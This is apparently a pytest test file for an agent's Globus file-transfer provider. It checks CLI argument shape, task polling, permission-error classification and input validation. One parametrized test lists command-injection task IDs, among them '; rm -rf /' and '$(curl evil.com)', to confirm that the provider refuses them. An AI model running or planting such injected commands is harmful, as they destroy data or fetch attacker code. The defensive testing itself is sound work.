"""
L14 cheat-guards — GlobusProvider wire-protocol shape.

GlobusProvider shells out to `globus transfer` + `globus task show`
and parses --format json output. The whole thing is mediated by
subprocess; we mock it carefully to pin:

  - Submit shape: argv is exactly the canonical
    `globus transfer <local>:<src> <remote>:<dst> --label ...
     --encrypt-data --format json` (no shell, no env-leakage).
  - Sync wait blocks until SUCCEEDED, surfaces FAILED with
    fatal_error.code/description.
  - INACTIVE status (creds expired) hard-errors immediately rather
    than spinning forever.
  - `globus` CLI not on PATH surfaces a clear actionable error
    rather than a stack trace.
  - async_return=True returns the task_id IMMEDIATELY without
    polling, with verified_method="globus_pending" and a hint
    pointing the caller at globus_task_status.
  - Endpoint UUIDs from the validated config thread into argv
    correctly (local→remote for upload, remote→local for download).
  - globus_task_status (the public poll primitive) refuses smuggled
    metacharacters in task_id BEFORE any subprocess.
"""
from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from agent.skills import transfer_providers


_LOCAL_EP = "11111111-1111-1111-1111-111111111111"
_REMOTE_EP = "22222222-2222-2222-2222-222222222222"
_TASK_ID = "33333333-3333-3333-3333-333333333333"


def _globus_block() -> dict:
    return {
        "local_endpoint_id":    _LOCAL_EP,
        "local_endpoint_name":  "user1-laptop",
        "remote_endpoint_id":   _REMOTE_EP,
        "remote_endpoint_name": "HPC RC DataMover",
    }


def _env_ssh() -> dict:
    return {"name": "hpc_cluster", "type": "ssh",
            "host": "hpc_cluster.example.edu", "user": "user1"}


def _provider() -> transfer_providers.GlobusProvider:
    return transfer_providers.GlobusProvider(_globus_block())


# ===========================================================================
# Argv shape — the most security-relevant pin
# ===========================================================================

class TestSubmitArgvShape:
    @pytest.mark.integration
    def test_upload_argv_is_local_to_remote(self, monkeypatch, tmp_path):
        captured = []
        def fake_run(argv, *a, **kw):
            captured.append(argv)
            mock = MagicMock()
            mock.returncode = 0
            mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            mock.stderr = ""
            return mock
        monkeypatch.setattr(subprocess, "run", fake_run)
        f = tmp_path / "x.txt"
        f.write_text("hi")
        # async_return so we exit after submit (no poll)
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60, async_return=True)
        assert "error" not in out, out
        assert captured, "no subprocess call recorded"
        argv = captured[0]
        # argv[0] is `globus`, argv[1] is `transfer`
        assert argv[0] == "globus"
        assert argv[1] == "transfer"
        # Source is the LOCAL endpoint, destination is REMOTE.
        assert argv[2] == f"{_LOCAL_EP}:{f}"
        assert argv[3] == f"{_REMOTE_EP}:/work/u/x.txt"
        # Encrypted by default + JSON output for parsing.
        assert "--encrypt-data" in argv
        assert "--format" in argv
        fmt_idx = argv.index("--format")
        assert argv[fmt_idx + 1] == "json"
        assert "--label" in argv

    @pytest.mark.integration
    def test_download_argv_is_remote_to_local(self, monkeypatch, tmp_path):
        captured = []
        def fake_run(argv, *a, **kw):
            captured.append(argv)
            mock = MagicMock()
            mock.returncode = 0
            mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            mock.stderr = ""
            return mock
        monkeypatch.setattr(subprocess, "run", fake_run)
        out_path = tmp_path / "fetched.bam"
        out = _provider().download_one(
            env=_env_ssh(), abs_remote_path="/work/u/in.bam",
            local_path=out_path, timeout=60, async_return=True)
        assert "error" not in out, out
        argv = captured[0]
        # Source is REMOTE, destination is LOCAL.
        assert argv[2] == f"{_REMOTE_EP}:/work/u/in.bam"
        assert argv[3] == f"{_LOCAL_EP}:{out_path}"


# ===========================================================================
# Sync wait behavior
# ===========================================================================

class TestSyncWait:
    @pytest.mark.integration
    def test_sync_blocks_until_succeeded(self, monkeypatch, tmp_path):
        # Submit returns immediately; task_show returns ACTIVE twice then
        # SUCCEEDED. The provider must poll past the ACTIVEs.
        task_states = iter([
            {"DATA_TYPE": "task", "task_id": _TASK_ID, "status": "ACTIVE"},
            {"DATA_TYPE": "task", "task_id": _TASK_ID, "status": "ACTIVE"},
            {"DATA_TYPE": "task", "task_id": _TASK_ID, "status": "SUCCEEDED",
             "bytes_transferred": 1234, "files_transferred": 1,
             "nice_status": None, "fatal_error": None},
        ])
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            else:
                mock.stdout = _json.dumps(next(task_states))
            return mock
        # Patch sleep so we don't pay real time waiting.
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert out["success"] is True
        assert out["task_id"] == _TASK_ID
        assert out["verified_method"] == "globus_end_to_end"
        assert out["bytes"] == 1234

    @pytest.mark.integration
    def test_failed_task_returns_clear_error(self, monkeypatch, tmp_path):
        # Generic FAILED — anything OTHER than the PERMISSION_DENIED
        # data_access case (covered separately) should surface as a
        # clear error with the fatal_error code + description.
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            else:
                mock.stdout = _json.dumps({
                    "DATA_TYPE": "task", "task_id": _TASK_ID,
                    "status": "FAILED",
                    "fatal_error": {"code": "ENDPOINT_ERROR",
                                    "description": "remote path readonly"},
                })
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/ro/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert "FAILED" in out["error"]
        assert "ENDPOINT_ERROR" in out["error"]
        assert "remote path readonly" in out["error"]
        assert out["task_id"] == _TASK_ID

    @pytest.mark.integration
    def test_inactive_short_circuits(self, monkeypatch, tmp_path):
        # INACTIVE = creds expired. We DON'T spin on it; we surface
        # immediately with a hint pointing at `globus session update`.
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            else:
                mock.stdout = _json.dumps({
                    "DATA_TYPE": "task", "task_id": _TASK_ID,
                    "status": "INACTIVE",
                    "nice_status": "Creds Expired",
                })
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert "INACTIVE" in out["error"]
        assert "Creds Expired" in out["error"]
        assert out.get("hint")


# ===========================================================================
# data_access consent gap — the most common first-time-setup failure
# ===========================================================================

class TestPermissionDeniedClassifier:
    """PERMISSION_DENIED has three real root causes: a local GCP path
    restriction, a missing data_access consent on the remote, and
    remote-side POSIX permissions. They present identically at the task
    level (status=ACTIVE, nice_status=PERMISSION_DENIED); the classifier
    fetches the task's event list and routes the hint by which endpoint
    reported the error."""

    @staticmethod
    def _local_path_block_event() -> dict:
        # The shape Globus emits when GCP refuses to scan a path that
        # isn't in its Accessible Folders list.
        import json as _json
        return {
            "DATA": [{
                "DATA_TYPE": "event",
                "code": "PERMISSION_DENIED",
                "description": "permission denied",
                "is_error": True,
                "details": _json.dumps({
                    "context": [{
                        "operation": "Directory List / File Scan",
                        "path": "/tmp/probe.txt",
                    }],
                    "error": {
                        "body": "500 Command failed : Path not allowed.\n",
                        "code": 500,
                        "endpoint": f"my data ({_LOCAL_EP})",
                        "server": "Globus Connect",
                        "type": "FTPServerError",
                    },
                }),
            }],
        }

    @staticmethod
    def _remote_consent_event() -> dict:
        import json as _json
        return {
            "DATA": [{
                "DATA_TYPE": "event",
                "code": "PERMISSION_DENIED",
                "description": "permission denied",
                "is_error": True,
                "details": _json.dumps({
                    "context": [{
                        "operation": "FTP STOR",
                        "path": "/work/u/dest.bam",
                    }],
                    "error": {
                        "body": ("Missing data_access consent on the "
                                 "destination GCS endpoint."),
                        "code": 530,
                        "endpoint": f"HPC, RC, DataMover ({_REMOTE_EP})",
                        "type": "GCSError",
                    },
                }),
            }],
        }

    @staticmethod
    def _remote_fs_event() -> dict:
        import json as _json
        return {
            "DATA": [{
                "DATA_TYPE": "event",
                "code": "PERMISSION_DENIED",
                "description": "permission denied",
                "is_error": True,
                "details": _json.dumps({
                    "context": [{
                        "operation": "FTP STOR",
                        "path": "/work/readonly/dest.bam",
                    }],
                    "error": {
                        "body": ("Permission denied: cannot write to "
                                 "/work/readonly (POSIX EACCES)."),
                        "code": 550,
                        "endpoint": f"HPC, RC, DataMover ({_REMOTE_EP})",
                        "type": "FTPServerError",
                    },
                }),
            }],
        }

    @pytest.mark.integration
    def test_local_path_not_allowed(self, monkeypatch, tmp_path):
        # GCP refuses to scan the source path → classifier surfaces the
        # "add to Accessible Folders" hint, NOT a consent hint.
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            elif argv[1] == "task" and argv[2] == "show":
                mock.stdout = _json.dumps({
                    "DATA_TYPE": "task", "task_id": _TASK_ID,
                    "status": "ACTIVE", "nice_status": "PERMISSION_DENIED",
                })
            elif argv[1] == "task" and argv[2] == "event-list":
                mock.stdout = _json.dumps(
                    TestPermissionDeniedClassifier._local_path_block_event())
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert out["classification"] == "local_path_not_allowed"
        assert "/tmp/probe.txt" in out["error"]
        assert "Accessible Folders" in out["error"]
        # MUST NOT recommend the consent fix — it'd mislead.
        assert "globus login --gcs" not in out["error"]
        assert out["hint"] == "GCP Accessible Folders restriction on local source"

    @pytest.mark.integration
    def test_remote_consent_missing(self, monkeypatch, tmp_path):
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            elif argv[1] == "task" and argv[2] == "show":
                mock.stdout = _json.dumps({
                    "DATA_TYPE": "task", "task_id": _TASK_ID,
                    "status": "ACTIVE", "nice_status": "PERMISSION_DENIED",
                })
            elif argv[1] == "task" and argv[2] == "event-list":
                mock.stdout = _json.dumps(
                    TestPermissionDeniedClassifier._remote_consent_event())
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert out["classification"] == "remote_consent_missing"
        assert "globus login --gcs" in out["error"]
        assert _REMOTE_EP in out["error"]
        # MUST NOT mention GCP Accessible Folders — that's the wrong fix.
        assert "Accessible Folders" not in out["error"]
        assert out["hint"] == "missing data_access consent on remote GCS"

    @pytest.mark.integration
    def test_remote_filesystem(self, monkeypatch, tmp_path):
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            elif argv[1] == "task" and argv[2] == "show":
                mock.stdout = _json.dumps({
                    "DATA_TYPE": "task", "task_id": _TASK_ID,
                    "status": "ACTIVE", "nice_status": "PERMISSION_DENIED",
                })
            elif argv[1] == "task" and argv[2] == "event-list":
                mock.stdout = _json.dumps(
                    TestPermissionDeniedClassifier._remote_fs_event())
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert out["classification"] == "remote_filesystem"
        assert "/work/readonly/dest.bam" in out["error"]
        assert "POSIX EACCES" in out["error"]
        # Don't suggest a Globus consent fix — that's not what's wrong.
        assert "globus login --gcs" not in out["error"]
        assert out["hint"] == "remote filesystem permission denied"

    @pytest.mark.integration
    def test_event_list_fetch_failure_falls_back_to_honest_unknown(
            self, monkeypatch, tmp_path):
        # If event-list itself errors (Globus API hiccup, CLI uninstalled
        # mid-task), we MUST NOT lie about the cause — surface "unknown"
        # with an honest pointer to the manual command.
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.stderr = ""
            if argv[1] == "transfer":
                mock.returncode = 0
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            elif argv[1] == "task" and argv[2] == "show":
                mock.returncode = 0
                mock.stdout = _json.dumps({
                    "DATA_TYPE": "task", "task_id": _TASK_ID,
                    "status": "ACTIVE", "nice_status": "PERMISSION_DENIED",
                })
            elif argv[1] == "task" and argv[2] == "event-list":
                mock.returncode = 1
                mock.stderr = "API temporarily unavailable"
                mock.stdout = ""
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert out["classification"] == "unknown"
        assert "event-list" in out["error"]
        assert f"globus task event-list {_TASK_ID}" in out["error"]
        # Don't invent a fix we can't justify.
        assert "globus login --gcs" not in out["error"]

    @pytest.mark.integration
    def test_active_without_permission_denied_keeps_polling(
            self, monkeypatch, tmp_path):
        # Benign nice_status values must NOT trip the classifier.
        import json as _json
        states = iter([
            {"DATA_TYPE": "task", "task_id": _TASK_ID, "status": "ACTIVE",
             "nice_status": "OK"},
            {"DATA_TYPE": "task", "task_id": _TASK_ID, "status": "ACTIVE",
             "nice_status": "Queued"},
            {"DATA_TYPE": "task", "task_id": _TASK_ID, "status": "SUCCEEDED",
             "bytes_transferred": 42, "files_transferred": 1,
             "nice_status": None, "fatal_error": None},
        ])
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            else:
                mock.stdout = _json.dumps(next(states))
            return mock
        import time
        monkeypatch.setattr(time, "sleep", lambda *a, **kw: None)
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert out["success"] is True
        assert out["verified_method"] == "globus_end_to_end"


# ===========================================================================
# Async return — no polling, immediate task_id
# ===========================================================================

class TestAsyncReturn:
    @pytest.mark.integration
    def test_async_return_skips_polling(self, monkeypatch, tmp_path):
        polls = {"n": 0}
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            if argv[1] == "transfer":
                mock.stdout = f'{{"task_id": "{_TASK_ID}"}}'
            else:
                polls["n"] += 1
                mock.stdout = '{"status": "ACTIVE"}'
            return mock
        monkeypatch.setattr(subprocess, "run", fake_run)

        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60, async_return=True)
        assert out["success"] is True
        assert out["task_id"] == _TASK_ID
        assert out["verified_method"] == "globus_pending"
        # We did NOT call globus task show — the whole point of async.
        assert polls["n"] == 0
        # The note must steer the caller at globus_task_status.
        assert "globus_task_status" in out.get("note", "")


# ===========================================================================
# CLI-missing / auth / consent — actionable hints
# ===========================================================================

class TestCliMissing:
    @pytest.mark.integration
    def test_globus_cli_not_on_path(self, monkeypatch, tmp_path):
        def fake_run(*a, **kw):
            raise FileNotFoundError("globus")
        monkeypatch.setattr(subprocess, "run", fake_run)
        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert "not on PATH" in out["error"]
        assert "pipx install globus-cli" in out["error"]

    @pytest.mark.integration
    def test_auth_error_emits_hint(self, monkeypatch, tmp_path):
        def fake_run(*a, **kw):
            mock = MagicMock(); mock.returncode = 1
            mock.stdout = ""
            mock.stderr = ("Globus auth failure — no valid auth tokens "
                           "found, run `globus login`")
            return mock
        monkeypatch.setattr(subprocess, "run", fake_run)
        f = tmp_path / "x.txt"; f.write_text("hi")
        out = _provider().upload_one(
            env=_env_ssh(), local_path=f, abs_remote_path="/work/u/x.txt",
            local_sha256="0"*64, timeout=60)
        assert "error" in out
        assert "globus transfer" in out["error"]
        assert out.get("hint") == "run `globus login` to authenticate first"


# ===========================================================================
# globus_task_status — the public async-poll primitive
# ===========================================================================

class TestTaskStatusPrimitive:
    @pytest.mark.integration
    def test_task_status_happy_path(self, monkeypatch):
        import json as _json
        def fake_run(argv, *a, **kw):
            mock = MagicMock(); mock.returncode = 0; mock.stderr = ""
            mock.stdout = _json.dumps({
                "DATA_TYPE": "task", "task_id": _TASK_ID,
                "status": "SUCCEEDED",
                "bytes_transferred": 99999,
                "files_transferred": 3, "files_skipped": 0,
                "fatal_error": None, "type": "TRANSFER",
                "nice_status": None,
            })
            return mock
        monkeypatch.setattr(subprocess, "run", fake_run)
        env = {**_env_ssh(),
               "data_transfer": {"type": "globus",
                                  "globus": _globus_block()}}
        out = transfer_providers.globus_task_status(env, _TASK_ID)
        assert out["success"] is True
        assert out["status"] == "SUCCEEDED"
        assert out["bytes_transferred"] == 99999
        assert out["files_transferred"] == 3

    @pytest.mark.integration
    @pytest.mark.parametrize("bad_task_id", [
        "not-a-uuid",
        "; rm -rf /",
        "$(curl evil.com)",
        "27155-aaa",
        "",
        "33333333-3333-3333-3333-333333333333; ls",
    ])
    def test_task_status_refuses_bad_uuid(self, monkeypatch, bad_task_id):
        # Bad task_id must be refused BEFORE any subprocess — defense
        # against smuggling a metacharacter into the globus CLI argv.
        called = []
        monkeypatch.setattr(subprocess, "run",
                            lambda *a, **kw: called.append(a) or MagicMock())
        env = {**_env_ssh(),
               "data_transfer": {"type": "globus",
                                  "globus": _globus_block()}}
        out = transfer_providers.globus_task_status(env, bad_task_id)
        assert "error" in out
        assert "canonical UUID" in out["error"]
        assert called == []

    @pytest.mark.integration
    def test_task_status_refuses_non_globus_env(self):
        # An env without data_transfer.type=globus has no Globus tasks
        # to poll. Surface clearly rather than running globus blindly.
        env_scp = {**_env_ssh()}  # no data_transfer block
        out = transfer_providers.globus_task_status(env_scp, _TASK_ID)
        assert "error" in out
        assert "globus" in out["error"].lower()


# ===========================================================================
# Factory dispatch — ensures the YAML wires to the right provider
# ===========================================================================

class TestFactoryDispatch:
    @pytest.mark.integration
    def test_globus_env_returns_globus_provider(self):
        env = {**_env_ssh(),
               "data_transfer": {"type": "globus",
                                  "globus": _globus_block()}}
        p = transfer_providers.get_transfer_provider(env)
        assert isinstance(p, transfer_providers.GlobusProvider)
        assert p._local_ep == _LOCAL_EP
        assert p._remote_ep == _REMOTE_EP

    @pytest.mark.integration
    def test_scp_env_returns_scp_provider(self):
        env = _env_ssh()  # no data_transfer → default
        p = transfer_providers.get_transfer_provider(env)
        assert isinstance(p, transfer_providers.ScpHeadNodeProvider)

    @pytest.mark.integration
    def test_local_env_returns_none(self):
        p = transfer_providers.get_transfer_provider({"name": "x", "type": "local"})
        assert p is None
